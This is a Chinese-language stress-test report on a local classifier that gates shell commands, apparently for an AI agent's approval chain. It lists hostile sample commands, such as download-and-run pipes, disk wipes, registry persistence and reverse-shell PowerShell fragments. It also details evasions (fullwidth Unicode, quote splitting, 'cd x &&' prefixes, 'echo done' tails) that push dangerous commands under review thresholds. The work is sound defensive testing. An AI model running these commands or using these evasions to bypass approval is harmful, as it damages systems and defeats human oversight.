# 端侧线性命令分类器压测报告（factory-2026-11-14-5）

> 压测日期：2026-11-14 · 环境：Windows 11（10.0.26300）· Node v24.22.1
> 被测对象：`frontend/src/ai/local-classifier-weights.mjs`（factory-2026-11-14-5，int8 量化，8192 维）+ `frontend/src/ai/ai-local-classifier.js` 的 `lcExtractDims / lcScore / lcDequantize`
> 阈值语义：宽松 0.30 / 标准 0.15 / 严格 0.07（`score < T` 放行，`≥ T` 转人工）；score 高 = 危险
> 压测脚本全部位于仓库外 `%TEMP%\lc-stress\`（Node ESM，绝对路径 import 仓库文件），**未修改仓库任何文件**；原始指标 JSON 同目录 `out\*.json`，可完整复现（见附录 A）。

---

## 1. 执行摘要

1. **硬危险命令三档零误放（合成 1320 条 + 公开破坏性子集 105 条）**。合成危险类最低分 0.6537，远高于宽松档 0.30；LOLBAS 破坏性 76 条、恶意 PowerShell 破坏性 26 条在宽松档仅 1 条误放（`IEX HBar0`，0.226）。出厂权重头声明的「硬危险误放 0 · 标准档误放 0」在全部危险侧样本（合成 dangerous 1320 + gray 502、攻击侧 897、对抗变体 2950）上成立。
2. **对抗压测发现两个真实漏洞**：① `cd x && ` 前缀与 `; echo done` 尾巴可把 0.97 的危险命令拉到 0.15–0.26（宽松档误放）——根因是语料生成器**只给 safe 类加这些装饰**，位置模式成了标签泄漏；② Unicode 全角化（NFKC 未归一）导致危险类 14.33%（宽松）/3.33%（标准）误放。两者都有低成本修复（语料对危险类同比例装饰；特征化前置 `normalize('NFKC')`，已验证修复后 0.1177 → 0.9994）。
3. **安全侧零漏拦但严格档打扰偏高**：合成 safe 1580 条三档误拦 0.82% / 2.34% / 5.51%；SEA 真实用户裸命令严格档放行仅 68.6%（标准档 97.0%）。标准档误拦集中在少数未知词/灰动词（`gsv`、`npm root`、`git stash list`），严格档额外把大量未知词基线（σ(bias)=0.2824）全部拦下——严格档只适合排查场景，与方案定位一致。
4. **性能余量极大**：单条端到端 10.7 µs（30 字符）～ 27.8 µs（67 字符）～ 188 µs（2KB 上限），权重加载 0.13–0.19 ms，活动权重仅 32 KB。分类器不会成为审批链路瓶颈。
5. **输入边界稳健**：null / undefined / 空串 / emoji / 2KB / 超上限截断全部无崩溃；危险前缀 + emoji/垃圾填充仍是 0.98+ 高分拦截；重复空格被预处理 `\s+→' '` 完全中和（0 误放 0 误拦抬升）。

---

## 2. 方法与数据源

| 数据源 | 提取方式 | 标签语义 |
| --- | --- | --- |
| 合成语料（`scripts/classifier-corpus.mjs`） | 5 个 seed（1 / 42 / 777 / 20260101 / 99999999）× {safe:400, dangerous:400, gray:130}，跨 seed 去重 | safe=0（只读可放行）；dangerous=1（破坏性）；gray=1（良性但策略须转人工） |
| SEA（User1..User50） | 每行一条裸命令，≤120 字符 | **正常侧**（真实 UNIX 用户），只看误打扰（误拦）率——沿用 `scripts/eval-public-corpus.mjs` 先例 |
| Cowrie 蜜罐（cowrie/*.json） | `eventid` 为 `cowrie.command.input` / `cowrie.session.input` 的 `.input` 字段，多行拆分 | 攻击侧：全量当危险看误放，**破坏性子集**（仓库同款参照规则集）为准 |
| malbash（*.sh 非 # 行） | 逐行取命令行 | 攻击侧，同上 |
| LOLBAS（**/*.yml） | 提取 `Command:` 行 | 攻击侧，同上 |
| 恶意 PowerShell（*.ps1） | 非 # 且以字母数字 `$ @ ( [ . " / \` 开头的行 | 攻击侧，同上 |
| 对抗变体 | 自写 10 族变换（§4），基础命令池 = `generateCorpus(424242, {safe:300, dangerous:300})` 去重（与评估集不同 seed） | 标签沿用基础命令 |
| 边界用例 | 固定清单（空串/单字符/纯符号/2KB/emoji/纯数字/超上限） | 逐条人工解读 |

> 标签语义警告（沿仓库 eval 先例）：公开攻击语料的「恶意/良性」与本应用的「策略性 auto-approve」不同构。蜜罐里的 `ls`、恶意脚本里的 `echo`/赋值行属侦察/脚手架，按本应用策略本就该放行；因此攻击侧误放以**破坏性子集**（独立正则参照集，与分类器无关）为主指标，全量误放数仅作参考量级。

数据规模：合成 4650 条原始 → 3402 条唯一（safe 1580 / dangerous 1320 / gray 502）；SEA 75 万行 → 856 唯一；Cowrie 22 → 13（该数据集 command.input 事件本就只有 22 条）；malbash 40 → 34；LOLBAS 492 → 451（破坏性 76）；恶意 PowerShell 462 → 399（破坏性 26）。攻击侧破坏性子集合计 105 条（1+2+76+26）。对抗变体 10 族 × 危险/安全两池，每侧 ≤300 条变体（实测 266–300/侧，合计 546–600/族，共 5898 条）。

---

## 3. 各数据源三档阈值结果

### 3.1 合成语料（3402 条唯一）

| 类别 | 条数 | score 中位 | 放行@宽松 | 放行@标准 | 放行@严格 | 误放@宽松 | 误放@标准 | 误放@严格 | 误拦@宽松 | 误拦@标准 | 误拦@严格 |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| dangerous（破坏性） | 1320 | 0.9979 | 0% | 0% | 0% | **0（0%）** | **0（0%）** | **0（0%）** | — | — | — |
| gray（策略转人工） | 502 | 0.9893 | 0.80% | 0.20% | 0.20% | 4（0.80%） | 1（0.20%） | 1（0.20%） | — | — | — |
| safe（只读） | 1580 | 0.0031 | 99.18% | 97.66% | 94.49% | — | — | — | 13（0.82%） | 37（2.34%） | 87（5.51%） |

- dangerous 最低分 0.6537、p10 = 0.9829：距宽松档 0.30 有 2 倍以上余量，无逼近阈值的临界样本。
- gray 宽松档 4 条误放与出厂声明一致（权重文件头：宽松档部分放行是设计行为）。但 `mkdir -p frontend/src/tmp` 仅 0.0452 明显偏低（灰色类学习不均，见问题 #4）。
- safe 误拦 top15（标准档，score + 命令）：

| score | 命令 |
| ---: | --- |
| 0.7629 | `gsv telemetry-agent` |
| 0.7629 | `GSV telemetry-agent`（与前条小写同形） |
| 0.6248 | `git stash list` |
| 0.6025 | `Test-Path temp.dat` |
| 0.5836 | `npm root -g`（含 `NPM ROOT -G` 小写同形） |
| 0.5797 | `npm root` |
| 0.5605 | `gsv chrome` |
| 0.5059 | `type "main.go"` |
| 0.4746 | `Test-Path "image.png"` |
| 0.4590 | `GIT  DESCRIBE --TAGS` |
| 0.3254 | `Test-Path debug.log` |
| 0.3254 | `file Cargo.toml` |
| 0.2920 | `GIT BRANCH` / `git branch`（小写同形，第 14/15 条） |

- gray 误放（宽松档 4 条全部）：`mkdir -p frontend/src/tmp`（0.0452）、`set NODE_ENV=production`（0.2074）、`SET NODE_ENV=PRODUCTION`（同上）、`git revert HEAD`（0.2372）；标准档仅剩 `mkdir -p frontend/src/tmp`。

### 3.2 公开语料（唯一化后 1753 条）

| 数据源 | 语义 | 唯一条数（破坏性） | 放行@宽松 | 放行@标准 | 放行@严格 | 破坏性子集误放@宽松 | @标准 | @严格 |
| --- | --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| SEA 50 用户 | 正常侧 | 856 | 99.65% | 96.96% | 68.57% | —（误拦视角） | — | — |
| Cowrie 蜜罐 | 攻击侧 | 13（1） | 38.46% | 30.77% | 15.38% | 0（0%） | 0 | 0 |
| malbash 恶意脚本 | 攻击侧 | 34（2） | 44.12% | 32.35% | 17.65% | 0（0%） | 0 | 0 |
| LOLBAS 白利用 | 攻击侧 | 451（76） | 7.10% | 3.33% | 1.11% | 0（0%） | 0 | 0 |
| 恶意 PowerShell | 攻击侧 | 399（26） | 31.58% | 20.80% | 13.53% | 1（3.85%） | 0 | 0 |

- **破坏性子集 105 条合计仅 1 条宽松档误放**：恶意 PowerShell 的 `IEX HBar0`（0.226）——裸 `IEX` 变量、无 URL/编码载荷词面，标准档即转人工。
- 全量误放（攻击侧低分样本）按语义解读均为侦察/脚手架，抽查最多 15 条：
  - Cowrie（4）：`ls 2>/dev/null` 0.0074、`>D6@/XJ'8` 0.0510（乱敲键盘）、`uname -a` 0.1023、`/bin/eyshcjdmzg` 0.1098。
  - malbash（标准档 11 条全列）：`} 2>&1 | tee -a ./work.log` 0.0089、`exit` 0.0218、`whoami` 0.0361、`done` 0.0407、`{` 0.0495、`do` 0.0510、`echo	"Detecting Blockdevices..."` 0.0901、`echo    " "` 0.0953、`cd ./..` 0.1023、`echo ""` 0.1129、`echo "${fqn}"` 0.1331。
  - LOLBAS（标准档 top15，裸二进制名/模板占位符）：`echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt` 0.0163、`|` 0.0243、`WorkFolders` 0.0335、`eudcedit` 0.0582、`write.exe` 0.0609、`DeviceCredentialDeployment` 0.0769、`sigverif.exe` 0.0940、`fsi.exe` 0.1113、`code.exe tunnel --accept-server-license-terms --name "tunnel-name` 0.1160、`odbcad32.exe` 0.1278、`csc -target:library {PATH:.cs}` 0.1278、`echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js` 0.1278、`wsl.exe` 0.1295、`wbemtest.exe` 0.1424、`wab.exe` 0.1463。
  - 恶意 PowerShell（标准档 top15，脚本碎片行）：`Set-StrictMode -Version 2` 0.0007、`$b64 = Get-Content -Path 'fix\data.txt';` 0.0027、`$SS = $J.GetStream();` 0.0095、`[Sludrech1]::ReadFile(...)` 0.0101、`$stream = $client.GetStream();` 0.0107、`$w.Headers.add('Host','hacktree.org')` 0.0120、`$Sludrech3=0;` 0.0129、`$Sludrech9=1048576;` 0.0144、`$stream = $client.GetStream()` 0.0158、`$SS.Write($L,0,$L.Length);` 0.0163、`$gf=('55155155,...')` 0.0168、`[IO.File]::WriteAllBytes($filename, $bytes);` 0.0176、`while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;...` 0.0202、`$Sludrech5=0;` 0.0212、`exit` 0.0218。
- SEA 误拦 top15（标准档，正常侧被打扰的真实命令）：`install-` 0.5874、`format.d` 0.4280、`force_up` 0.3901、`killall` 0.2824、`chmod` 0.2729、`expreser` 0.2576、`rtslave` 0.2429、`rootless` 0.2372、`edg_prel` 0.2233、`touch` 0.2153、`interest` 0.2100、`compress` 0.2023、`local.Sq` 0.1973、`download` 0.1973、`domainna` 0.1852。其中 `killall / chmod / touch / install- / download` 属策略灰动词，转人工符合设计；`expreser / rtslave / rootless / edg_prel / interest` 等未知词是「σ(bias) 基线 + 少量 gram」的保守抬升（见问题 #6）。

---

## 4. 对抗变体压测

10 族变换，标签沿用基础命令；对照组 = 无变换基础池（dangerous 300 条误放 0/0/0；safe 300 条误拦 1% / 2.67% / 6.67%）。

### 4.1 危险侧误放率（按宽松档误放率降序）

| 变换族 | n | 误放@宽松 0.30 | 误放@标准 0.15 | 误放@严格 0.07 | 评价 |
| --- | ---: | ---: | ---: | ---: | --- |
| fullwidth（Unicode 全角 ｒｍ） | 300 | **43（14.33%）** | **10（3.33%）** | **3（1.00%）** | 唯一能稳定骗过模型诱导误放的族 |
| quote（引号插入 r"m"/路径引号） | 300 | 4（1.33%） | 0 | 0 | 须「首词拆分 + 全部 flag 引号化」组合才奏效 |
| cd-prefix（`cd x && ` 前缀） | 300 | 4（1.33%） | 0 | 0 | 弱危险基座被拉到 0.15–0.28（见 §4.3） |
| tail-noise（`; echo done` / `&& true`） | 300 | 2（0.67%） | 0 | 0 | 同上 |
| case（全大写/交替） | 270 | 0 | 0 | 0 | 预处理 lower() 完全中和 |
| path-obf（/tmp/./x、a/../b、反斜杠混合） | 300 | 0 | 0 | 0 | 路径 gram 被稀释但首词桶/结构桶兜住 |
| var-expand（$HOME、%TEMP%） | 300 | 0 | 0 | 0 | — |
| long-pad（500 字符填充） | 300 | 0 | 0 | 0 | — |
| multi-space（重复空格） | 280 | 0 | 0 | 0 | 预处理 `\s+→' '` 完全中和 |
| chain（; / && 串接 2-3 条） | 300 | 0 | 0 | 0 | 中位数升到 1.0，链式只会更危险 |

- fullwidth 误放样例（score + 变体）：`ｃｅｒｔｕｔｉｌ －ｕｒｌｃａｃｈｅ －ｓｐｌｉｔ －ｆ ｈｔｔｐｓ：／／…／ｉｎｓｔａｌｌ．ｓｈ` 0.0283、`ｐｏｗｅｒｓｈｅｌｌ －ｃ Ｇｅｔ－ＣｈｉｌｄＩｔｅｍ ｜ Ｒｅｍｏｖｅ－Ｉｔｅｍ －Ｆｏｒｃｅ` 0.0320、`ｐｏｗｅｒｓｈｅｌｌ －ｗ ｈｉｄｄｅｎ －ｎｏｐ －ｃ ｉｅｘ（ｉｗｒ …）` 0.0525、`ｆｄｉｓｋ ／ｄｅｖ／ｓｄｂ` 0.1082、`ｍｋｆｓ．ｎｔｆｓ －－ｆｏｒｃｅ ／ｄｅｖ／ｈｄａ` 0.1177、`ｓｆｄｉｓｋ ／ｄｅｖ／ｎｖｍｅ０ｎ１ｐ２` 0.1243、`ｃｅｒｔｕｔｉｌ －ｄｅｃｏｄｅ … ｏｕｔ．ｅｘｅ` 0.1313、`Ｉｎｖｏｋｅ－ＷｅｂＲｅｑｕｅｓｔ … ｜ ｉｅｘ` 0.1444、`ｃｈｍｏｄ －Ｒ ７７７ ｃｏｖｅｒａｇｅ` 0.1483、`ｅｃｈｏ ｄａｔａ ＞ ／ｄｅｖ／ｓｄａ` 0.1523、`ｍｖ ｅｘａｍｐｌｅｓ ／ｄｅｖ／ｎｕｌｌ` 0.1670、`ＲＥＧ ａｄｄ ＨＫＣＵ＼…ＲｕｎＯｎｃｅ ／ｖ Ｄｅｂｕｇｇｅｒ ／ｄ ｐｏｗｅｒｓｈｅｌｌ．ｅｘｅ ／ｆ` 0.1876。全角化把全部 ASCII n-gram 归零，score 掉到「未知命令」基线附近；3 条（0.0283 / 0.0320 / 0.0525）连严格档都放行。
- quote 误放 4 条（宽松档）：`r"d" '/s' '/q' "D:/work/project"` 0.2023（基座 `rd /s /q`）、`r"d" "/s" '/q' logs` 0.2517、`RMDI"R" '/S' '/Q' LOGS` 0.2698、`IE"X" $x` 0.2855。共同点：2 字动词拆分 + flag 全部引号化后词面归零；若仅拆首词（`de"l" /f /s /q data.json` = 0.9676）仍被拦截。
- 金丝雀 × 10 族矩阵（出厂承诺命令的最坏情况）：**危险金丝雀被误放到标准档以下的仅 2 条**——`de"l" '/f' "/s" '/q' 'data.json'` 0.0792（quote 族，宽松+标准放行、严格档拦住）与 `ｃｕｒｌ －ｆｓＳＬ ｈｔｔｐｓ：／／…／ｉｎｓｔａｌｌ．ｓｈ ｜ ｓｈ` 0.0888（fullwidth 族，同样严格档拦住）；`rm -rf /`、`dd`、`format`、`git reset --hard`、`shutdown` 等其余 14 条在 10 族下全部三档拦截。

### 4.2 安全侧误拦率（对抗装饰的 UX 代价，按标准档降序）

| 变换族 | n | 误拦@宽松 | 误拦@标准 | 误拦@严格 |
| --- | ---: | ---: | ---: | ---: |
| fullwidth | 300 | 24.33% | 41.00% | 52.67% |
| var-expand（`export HOME=$HOME; ` / `set TEMP=%TEMP% && ` 前缀） | 300 | 9.00% | 14.33% | 25.67% |
| quote | 300 | 4.33% | 14.33% | 22.00% |
| path-obf | 300 | 5.00% | 9.67% | 18.67% |
| long-pad | 300 | 3.00% | 6.33% | 12.33% |
| multi-space | 266 | 1.13% | 3.01% | 6.77% |
| case | 282 | 1.06% | 2.48% | 6.74% |
| cd-prefix | 300 | 0.33% | 2.00% | 5.00% |
| tail-noise | 300 | 0.67% | 1.00% | 4.67% |
| chain（安全命令互链） | 300 | 0 | 0 | 0 |

典型安全误拦样例（标准档）：`export HOME=$HOME; clear` 0.9020、`npm root ././.data` 0.8740、`clear ././.data` 0.8052、`ｆｉｎｄｓｔｒ ｅｒｒｏｒ ＂ａｐｐ．ｐｙ＂` 0.7364、`gi"t" stash list` 0.8149、`export HOME=$HOME; ls` 0.7600。方向与危险侧一致：**任何把命令变成「未知词面」的装饰都会推向 σ(bias) 保守基线**——安全侧表现为误拦抬升，危险侧表现为误放（见问题 #2、#6）。

安全金丝雀在标准档被误拦 17 例（12 条安全金丝雀 × 10 族），集中在 fullwidth（6）/ var-expand（5）/ quote（2）等族，其中 `pwd ././.data` 0.4785、`export HOME=$HOME; ls -la src` 0.3393 为最重样本。

### 4.3 关键单点复现（位置装饰的分数塌陷）

| 基础命令（score） | 变体（score） | 塌陷幅度 |
| --- | --- | --- |
| `git reset --hard`（0.9738） | `cd /tmp && git reset --hard`（0.2576） | −0.72 |
| `GIT REBASE --ABORT`（0.9713） | `cd /tmp && GIT REBASE --ABORT`（0.1852） | −0.79 |
| `cp NUL data.csv`（0.6394） | `cd build && cp NUL data.csv`（0.2760） | −0.36 |
| `IEX ($code)`（0.7081） | `IEX ($code) ; echo done`（0.1503） | −0.56 |

根因：语料生成器的位置装饰**只施加于 safe 类**——`classifier-corpus.mjs` 第 330–334 行（`cd x &&` 前缀 15%、`| tee` 10%、`FOO=bar` 8%、`2>/dev/null` 12%），危险类从未见过「无害装饰 + 危险主体」的组合，模型学到了「cd 前缀/echo 尾巴 = 安全信号」。强危险词面（`rm -rf`、`dd of=`、`format C:`）gram 足以压过装饰，塌陷只发生在弱词面危险命令上（`git reset --hard`、`IEX $var`、`cp NUL`）。

---

## 5. 边界用例行为

| 输入 | dims | score | 宽松 | 标准 | 严格 | 备注 |
| --- | ---: | ---: | --- | --- | --- | --- |
| 空串 `""` / 纯空白 / `\t\n` | 0 | 0.2824 | 放行 | 转人工 | 转人工 | 零特征 = σ(bias) 基线 |
| null / undefined 输入 | 0 | 0.2824 | 放行 | 转人工 | 转人工 | 同上，无崩溃 |
| 单字符 `a` / `Z` | 2 | 0.0726 / 0.0510 | 放行 | 放行 | 严格档 a 转人工 | — |
| 纯符号 `;;;` / `&&&` | 4 | 0.0446 | 放行 | 放行 | 放行 | — |
| `>< \|`（竖线符号） | 7 | 0.1386 | 放行 | 放行 | 转人工 | — |
| 纯数字 `42` / `1234567890` / `123 456 789` | 2–19 | 0.0541–0.1948 | 放行 | 后者转人工 | 后两者转人工 | 多 token 数字抬升 |
| emoji `😀` / `👍👍👍👍👍` | 2–6 | 0.0533–0.0863 | 放行 | 放行 | 后者转人工 | UTF-16 码元 n-gram，无崩溃 |
| `🎉 rm -rf /tmp/build` | 37 | 0.9882 | 转人工 | 转人工 | 转人工 | emoji 前缀不破坏危险词面 |
| `ls 😀😀😀` | 13 | 0.0695 | 放行 | 放行 | 放行 | — |
| 2KB 纯字母 / 2KB 安全长路径 | 4 / 37 | 0.0541 / 0.0243 | 放行 | 放行 | 放行 | 2000 字符截断生效 |
| `rm -rf ` + 2KB 填充 | 19 | 0.9888 | 转人工 | 转人工 | 转人工 | 填充不稀释危险前缀 |
| `curl … \| sh #` + 2KB 填充 | 102 | 0.9997 | 转人工 | 转人工 | 转人工 | — |
| `rm -rf / ` + 5KB（超上限） | 23 | 0.9772 | 转人工 | 转人工 | 转人工 | `LC_TEXT_LIMIT=2000` 截断安全 |

结论：无崩溃、无 NaN；唯一值得留意的是**空输入在标准/严格档按 σ(bias)=0.2824 转人工**（见问题 #5）。

---

## 6. 性能数据

| 项目 | 数值 |
| --- | --- |
| 权重加载 `lcDequantize` | 首次 0.19 ms；20 次平均 0.134 ms（base64 10924 字符 → 8193 字节 int8 → 8192 维） |
| `lcExtractDims`（30 字符，55 维） | 10.760 µs/条（92,936 条/秒） |
| `lcExtractDims`（67 字符，131 维） | 25.683 µs/条（38,936 条/秒） |
| `lcExtractDims`（2000 字符上限） | 186.286 µs/条（5,368 条/秒） |
| `lcScore`（55 维 / 131 维） | 0.151 µs（660 万条/秒）/ 0.226 µs（442 万条/秒） |
| 端到端 extract+score | 30 字符 10.717 µs（93,309 条/秒）；67 字符 27.783 µs（35,993 条/秒）；2KB 187.860 µs（5,323 条/秒） |
| 权重活动集内存 | Float32Array(8192) = 32 KB（源码 base64 常量约 10.7 KB） |
| 进程内存（含 V8 基线） | heapUsed 10.13 MB / RSS 72.25 MB（Node 进程整体，非模型独占） |

- 耗时几乎全部在 `lcExtractDims`（哈希 n-gram + Set 去重），`lcScore` 可忽略；耗时随文本长度近线性（30→67 字符 ×2.4，→2000 字符 ×17）。
- 每命令一次分类 < 200 µs，相对审批链路（模型回复、人工交互）完全可忽略；10 万条/秒量级意味着即使整会话所有命令全部过分类器也无感。
- 基准方法：每项独立预热 5000 次后 3 轮计时取最小轮（消除 GC/调度噪声），各 10 万次（2KB 项 1 万次）。

---

## 7. 问题清单（按严重度排序）

| # | 严重度 | 问题 | 证据 | 建议 |
| --- | --- | --- | --- | --- |
| 1 | **高** | **语料位置装饰标签泄漏**：`cd x &&` 前缀、`; echo` 尾巴等装饰只出现在 safe 类（`classifier-corpus.mjs:330-334`），模型把「无害装饰」学成安全信号；`cd /tmp && git reset --hard` 从 0.9738 塌到 0.2576（宽松档误放），`IEX ($code) ; echo done` 从 0.7081 塌到 0.1503 | §4.3 表格；对抗族 cd-prefix / tail-noise 各 1.33% / 0.67% 宽松档误放 | 生成器对 dangerous/gray 类以同比例施加同一套装饰（或训练前对全部类做统一装饰增广）；重训后把 `cd x && <危险金丝雀>` 加进 `CANARIES.dangerous` |
| 2 | **高** | **Unicode 全角未归一**：`lcExtractDims` 只 lower 不 NFKC，全角化命令全部 gram 归零，危险侧 14.33%（宽松）/ 3.33%（标准）误放，`ｃｕｒｌ … ｜ ｓｈ` 0.0888；安全侧同步误拦 41%（标准）。注：全角命令在真实 shell 通常不可直接执行，风险取决于上游是否存在归一层，但端侧应做防御纵深 | §4.1；复现：`s('ｍｋｆｓ．ｎｔｆｓ －－ｆｏｒｃｅ ／ｄｅｖ／ｈｄａ')` = 0.1177，`normalize('NFKC')` 后 = 0.9994 | `lcExtractDims` 预处理在 `toLowerCase()` 前加 `String(command).normalize('NFKC')`；重训一轮并加全角金丝雀 |
| 3 | 中 | **LOLBAS 裸二进制名放行**：`eudcedit` 0.0582、`write.exe` 0.0609、`DeviceCredentialDeployment` 0.0769、`sigverif.exe` 0.0940、`wsl.exe` 0.1295 等 15 条标准档放行（宽松档 32 条）——无参数裸名词法上无险信号，其中部分是 LOLBAS 收录的滥用入口 | §3.2 LOLBAS 误放清单 | 生成器补「裸可执行名」灰色模板；或对 `w:*.exe` 裸名形态引入灰名单桶；短期靠大模型复核兜底（端侧未放行即转远程） |
| 4 | 中 | **灰色类学习不均**：`mkdir -p frontend/src/tmp` 仅 0.0452（灰色类中位 0.9893，它是 502 条里唯一的深度离群），宽松档 gray 误放 4 条里它标准档仍放行 | §3.1 gray 误放清单 | gray 语料补 `mkdir -p` 深路径变体；确认非模板撞车 |
| 5 | 低 | **空输入按 bias 基线转人工**：空串/纯空白/null 在标准/严格档 score=0.2824 → 转人工（fail-closed 方向安全，但属无意义打扰；正常链路空命令不应到达分类器） | §5 前四行 | `classifyAll`/`scoreText` 对 trim 后为空的命令直接返回「放行/跳过」 |
| 6 | 低 | **未知词保守基线偏高**：SEA 严格档 31.4% 裸命令被打扰，其中 `expreser / rtslave / rootless / interest` 等纯未知词 0.15–0.26（无语义险信号，纯 σ(bias) 抬升）；对抗装饰把安全命令推向同一基线（fullwidth 安全误拦 41%） | §3.2 SEA、§4.2 | 严格档仅用于排查场景（现状）；若需压缩，可为「低特征数 + 无结构桶」形态单设压低桶（需重训验证，警惕被滥用绕过） |
| 7 | 信息 | 重复空格、全大写、多命令链、路径混淆、变量展开、长填充对危险侧**零影响**——预处理 `\s+→' '`/lower 与结构桶设计有效 | §4.1 | 保持现状，回归时盯住这 5 族即可 |

### 复现命令（仓库外 Node 直连仓库文件，只读）

```js
// 存为 repro.mjs 后 node repro.mjs（或 node --input-type=module -e "<script>"）
const R = 'file:///D:/OraSkyC/Project/CandySweet/CaDt-DataLens/frontend/src/ai/';
const {lcDequantize, lcExtractDims, lcScore} = await import(R + 'ai-local-classifier.js');
const {LOCAL_CLASSIFIER_WEIGHTS: W, LOCAL_CLASSIFIER_QUANT: Q, LOCAL_CLASSIFIER_BIAS: B,
       LOCAL_CLASSIFIER_FEATURES: F} = await import(R + 'local-classifier-weights.mjs');
const w = lcDequantize(W, Q.scale, F.dims);
const s = (c) => lcScore(lcExtractDims(c, F), w, B).toFixed(4);

console.log('问题1 cd前缀塌陷 :', s('git reset --hard'), '→', s('cd /tmp && git reset --hard'));   // 0.9738 → 0.2576
console.log('问题1 echo尾巴  :', s('IEX ($code)'), '→', s('IEX ($code) ; echo done'));              // 0.7081 → 0.1503
console.log('问题2 全角误放  :', s('ｍｋｆｓ．ｎｔｆｓ －－ｆｏｒｃｅ ／ｄｅｖ／ｈｄａ'));                  // 0.1177
console.log('问题2 NFKC可修 :', s('ｍｋｆｓ．ｎｔｆｓ －－ｆｏｒｃｅ ／ｄｅｖ／ｈｄａ'.normalize('NFKC'))); // 0.9994
console.log('问题3 LOLBAS   :', s('eudcedit'), s('DeviceCredentialDeployment'));                    // 0.0582 / 0.0769
console.log('问题4 灰离群   :', s('mkdir -p frontend/src/tmp'));                                    // 0.0452
console.log('问题5 空输入   :', s(''));                                                             // 0.2824
```

---

## 附录 A：压测脚本与复现

- 脚本目录（仓库外）：`%TEMP%\lc-stress\`（`common.mjs`、`run-syn.mjs`、`run-pub.mjs`、`run-adv.mjs`、`run-boundary.mjs`、`run-perf.mjs`），指标 JSON 在 `%TEMP%\lc-stress\out\`（syn / pub / adv / boundary / perf）。运行：`node C:\Users\admin\AppData\Local\Temp\lc-stress\run-syn.mjs`（其余同理；总时长约 1 分钟，性能项约 40 秒）。
- 对抗变换实现（`run-adv.mjs`）：10 族，每族对 300 危险 + 300 安全基础命令各产一个变体（去重，实测每侧 266–300 条）；path-obf 无路径 token 时附加惰性混淆参数（`././.data` 等）保证覆盖率，该兜底同时贡献了安全侧 path-obf 误拦样本（`pwd ././.data` 0.4785）。
- 合成语料跨 seed 去重：seed 42/777/20260101/99999999 与先前种子重复 199/298/355/396 条，最终唯一 3402 条。
- 公开语料加载与「破坏性子集」参照规则集逐行沿用仓库 `scripts/eval-public-corpus.mjs`（该脚本本身未改动、未执行，压测使用等价实现以便分组输出案例）。
- 本报告为压测交付物，除此之外未新增/修改仓库任何文件；压测脚本与指标 JSON 留存于仓库外临时目录，不进入版本库。
